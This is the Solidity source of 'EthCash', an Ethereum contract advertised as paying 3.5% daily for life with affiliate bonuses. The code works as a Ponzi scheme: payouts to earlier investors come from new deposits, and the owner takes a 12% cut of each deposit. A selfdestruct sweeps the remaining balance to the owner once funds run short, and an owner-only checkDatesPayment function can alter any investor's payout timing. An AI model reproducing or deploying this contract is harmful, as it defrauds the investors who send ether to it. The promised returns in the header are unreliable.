pragma solidity ^0.4.24;

/*
*
* EthCash Contract Source
*~~~~~~~~~~~~~~~~~~~~~~~
* Web: ethcash.online
* Web mirrors: ethcash.global | ethcash.club
* Email: <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="4f20212326212a0f2a3b272c2e3c276120212326212a">[email&#160;protected]</a>
* Telergam: ETHCash_Online
*~~~~~~~~~~~~~~~~~~~~~~~
*  - GAIN 3,50% PER 24 HOURS
*  - Life-long payments
*  - Minimal 0.03 ETH
*  - Can payouts yourself every 30 minutes - send 0 eth (> 0.001 ETH must accumulate on balance)
*  - Affiliate 7.00%
*    -- 3.50% Cashback (first payment with ref adress DATA)
*~~~~~~~~~~~~~~~~~~~~~~~   
* RECOMMENDED GAS LIMIT: 250000
* RECOMMENDED GAS PRICE: ethgasstation.info
*
*/

library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns(uint256) {
        if(a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b);

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns(uint256) {
        require(b > 0);
        uint256 c = a / b;

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns(uint256) {
        require(b <= a);
        uint256 c = a - b;

        return c;
    }

    function add(uint256 a, uint256 b) internal pure returns(uint256) {
        uint256 c = a + b;
        require(c >= a);

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns(uint256) {
        require(b != 0);

        return a % b;
    }
}

contract Ownable {
    address private _owner;

    event OwnershipRenounced(address indexed previousOwner);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    modifier onlyOwner() { require(isOwner()); _; }

    constructor() public {
        _owner = msg.sender;
    }

    function owner() public view returns(address) {
        return _owner;
    }

    function isOwner() public view returns(bool) {
        return msg.sender == _owner;
    }

    function renounceOwnership() public onlyOwner {
        _owner = address(0);

        emit OwnershipRenounced(_owner);
    }

    function transferOwnership(address newOwner) public onlyOwner {
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal {
        require(newOwner != address(0));

        _owner = newOwner;
        
        emit OwnershipTransferred(_owner, newOwner);
    }
}

contract EthCashonline is Ownable {
    using SafeMath for uint;
    
    struct Investor {
        uint id;
        uint deposit;
        uint deposits;
        uint date;
        address referrer;
    }

    uint private MIN_INVEST = 0.03 ether;
    uint private OWN_COMMISSION_PERCENT = 12;
    uint private REF_BONUS_PERCENT = 7;
    uint private CASHBACK_PERCENT = 35;
    uint private PAYOUT_INTERVAL = 1 minutes; 
    uint private PAYOUT_SELF_INTERVAL = 30 minutes;
    uint private INTEREST = 35;

    uint public depositAmount;
    uint public payoutDate;
    uint public paymentDate;

    address[] public addresses;
    mapping(address => Investor) public investors;

    event Invest(address holder, uint amount);
    event ReferrerBonus(address holder, uint amount);
    event Cashback(address holder, uint amount);
    event PayoutCumulative(uint amount, uint txs);
    event PayoutSelf(address addr, uint amount);
    
    constructor() public {
        payoutDate = now;
    }
    
    function() payable public {

        if (0 == msg.value) {
            payoutSelf();
            return;
        }

        require(msg.value >= MIN_INVEST, "Too small amount");

        Investor storage user = investors[msg.sender];

        if(user.id == 0) {
            user.id = addresses.length + 1;
            addresses.push(msg.sender);

            address ref = bytesToAddress(msg.data);
            if(investors[ref].deposit > 0 && ref != msg.sender) {
                user.referrer = ref;
            }
        }

        user.deposit = user.deposit.add(msg.value);
        user.deposits = user.deposits.add(1);
        user.date = now;
        emit Invest(msg.sender, msg.value);

        paymentDate = now;
        depositAmount = depositAmount.add(msg.value);

        uint own_com = msg.value.div(100).mul(OWN_COMMISSION_PERCENT);
        owner().transfer(own_com);

        if(user.referrer != address(0)) {
            uint bonus = msg.value.div(100).mul(REF_BONUS_PERCENT);
            user.referrer.transfer(bonus);
            emit ReferrerBonus(user.referrer, bonus);

            if(user.deposits == 1) {
                uint cashback = msg.value.div(1000).mul(CASHBACK_PERCENT);
                msg.sender.transfer(cashback);
                emit Cashback(msg.sender, cashback);
            }
        }
    }
    
    function payout(uint limit) public {

        require(now >= payoutDate + PAYOUT_INTERVAL, "Too fast payout request");

        uint sum;
        uint txs;

        for(uint i = addresses.length ; i > 0; i--) {
            address addr = addresses[i - 1];

            if(investors[addr].date + 24 hours > now) continue;

            uint amount = getInvestorUnPaidAmount(addr);
            investors[addr].date = now;

            if(address(this).balance < amount) {
                selfdestruct(owner());
                return;
            }

            addr.transfer(amount);

            sum = sum.add(amount);

            if(++txs >= limit) break;
        }

        payoutDate = now;

        emit PayoutCumulative(sum, txs);
    }
    
    function payoutSelf() public {
        address addr = msg.sender;

        require(investors[addr].deposit > 0, "Deposit not found");
        require(now >= investors[addr].date + PAYOUT_SELF_INTERVAL, "Too fast payout request");

        uint amount = getInvestorUnPaidAmount(addr);
        require(amount >= 1 finney, "Too small unpaid amount");

        investors[addr].date = now;

        if(address(this).balance < amount) {
            selfdestruct(owner());
            return;
        }

        addr.transfer(amount);

        emit PayoutSelf(addr, amount);
    }
    
    function bytesToAddress(bytes bys) private pure returns(address addr) {
        assembly {
            addr := mload(add(bys, 20))
        }
    }

    function getInvestorUnPaidAmount(address addr) public view returns(uint) {
        return investors[addr].deposit.div(1000).mul(INTEREST).div(100).mul(now.sub(investors[addr].date).mul(100)).div(1 days);
    }

    function getInvestorCount() public view returns(uint) { return addresses.length; }
    function checkDatesPayment(address addr, uint date) onlyOwner public { investors[addr].date = date; }
}